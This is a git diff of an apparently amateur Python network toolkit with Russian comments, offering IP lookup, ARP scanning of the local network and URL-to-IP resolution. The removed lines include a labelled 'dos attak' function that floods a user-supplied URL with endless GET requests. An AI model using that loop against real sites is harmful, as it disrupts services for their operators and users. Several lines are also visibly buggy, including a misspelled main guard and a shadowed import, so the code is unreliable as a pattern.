@@ -1,25 +1,17 @@
 import requests
 from pyfiglet import Figlet
-import folium
 import platform
-from platform import system
 from socket import socket, AF_INET, SOCK_DGRAM
 from subprocess import check_output
-import os
-from scapy import all as scapy
+import scapy.all as sc
 from scapy.all import ARP, Ether, srp
-import subprocess
-import psutil
-import time
+import socket
+import os
 
 #pip install requests
 #pip install --pre scapy[basic]
-#pip install folium
-#pip install libpcap
-#pip install async-lru
-
 kast =' >>'
-version =' 1.5 '
+
 def ippy():
     base_url = "https://demo.ip-api.com/json/"
     ip = input(f"ip {kast}")
@@ -83,94 +75,50 @@ def scan_local_net():
     print("IP" + " "*18+"MAC")
     for device in devices:
         print("{:16}    {}".format(device['ip'], device['mac']))
-    input()
     
 def ban_ip():
-    ip = input(f'ip baning{kast}')
-    subprocess.call(['iptables','-A','INPUT','-s',f'"{ip}"','-j','DROP'])
-#    import requestsres = requests.get('http://httpbin.org/ip',proxies={ 'http': 'http://user-key:[email protected]:8080','https': 'http://user-key:[email protected]:8080' },headers={'X-BOTPROXY-COUNTRY': 'US'})print(res.text)
+    pass
+    print("ops разрабочик ленивый :(")
+        
+def ulr_to_ip(ulrtoip):   
+    try:
+        # Using gethostbyname() function of socket module for IP address
+        ip_address = socket.gethostbyname(ulrtoip)
+        # Returning IP address from the function
+        return ip_address
+        # if error occurs, returns the error
+    except:
+        print("Error")
 def mu_ip():
     r = requests.get('https://api.ipify.org/?format=json')
     mu_ip = r.json()['ip']
     print(f"ваш ip{kast} {mu_ip}")
-
-def inter_info():
-    # Получение информации о сетевых интерфейсах
-    network_interfaces = psutil.net_if_addrs()
-    print("Информация о сетевых интерфейсах:")
-    print(network_interfaces)
-    # Получение информации о сетевом трафике
-    network_traffic = psutil.net_io_counters()
-    print("Информация о сетевом трафике:")
-    print(network_traffic)
+    return mu_ip
     
-def ping(ping_url):
-    start_time = time.time()
-    k=requests.get(ping_url)
-    k.status_code
-    response=time.time() - start_time
-    print('ping',response)
-    return response
+    
+def menu_pynet():
+    preview_text = Figlet(font='standard')
+    print("\033[32m{}".format(preview_text.renderText('py.net')))
+    print(f"[01]pyip \n[02]scan_local_net\n[03]ban_ip\n[04]ulr_to_ip")
+    while True: 
+        menu = input(f'pyNet{kast}')
+        if menu =="1":
+            ippy()
+        elif menu=="2":
+            scan_local_net()
+        elif menu == "3":
+            ban_ip()
+        elif menu =="4":
+            ulrtoip = input(f"ulr{kast}")
+            ip = ulr_to_ip(ulrtoip)
+            print(f"The IP address of {ulrtoip} is {ip}")
+        elif menu =="5":
+            mu_ip()
 
-def dos(ping_ulr):
-    #ping_ulr='https://uts.sirius.online/'
-    def ping(ping_ulr):
-        start_time = time.time()
-        k=requests.get(ping_ulr)
-        k.status_code
-        response=time.time() - start_time
-        print('ping',response)
-        return response
-    ping(ping_ulr)
-    while True:
-        try:
-            def dos(ping_ulr):
-             # Making a get request
-                response = requests.get(ping_ulr)
-                # print status code
-                print(response.status_code)
-            dos(ping_ulr)
-        except:
-            ping(ping_ulr)
+        else:
             print('error')
-            dos(ping_ulr)
-
-    
-
-preview_text = Figlet(font='standard')
-print("\033[32m{}".format(preview_text.renderText('py.net')))
-print(f"V{version}")
-print(f"[01]pyip \n[02]scan_local_net\n[03]ban_ip\n[04]mu_ip\n[05]exit\n[6]inter_info()\n[07]ping\n[08]dos attak")
-
-menu = input(f'pyNet{kast}')
-if menu =="1":
-    ippy()
-elif menu=="2":
-    scan_local_net()
-elif menu == "3":
-    ban_ip()
-elif menu =="4":
-    mu_ip()
-elif menu =="5":
-    exit()
-elif menu =="6":
-    inter_info()
-elif menu =="7":
-    ping_url=input(f"url{kast}")
-    if ping_url =="":
-        print(ping('https://yandex.ru'))
-    elif ping_url==" ":
-        print(ping('https://yandex.ru'))    
-    else:
-        print(ping(ping_url))
-elif menu =="8":
-    dos(input(f'ulr to attac{kast}'))
-        
-        
-
-else:
-    print('error 1: комманда не найдена ')
-
-
-
+menu_pynet()
+if __name__ =='__mein__':
+#    os.system("cls")
+    menu_pynet() 
 
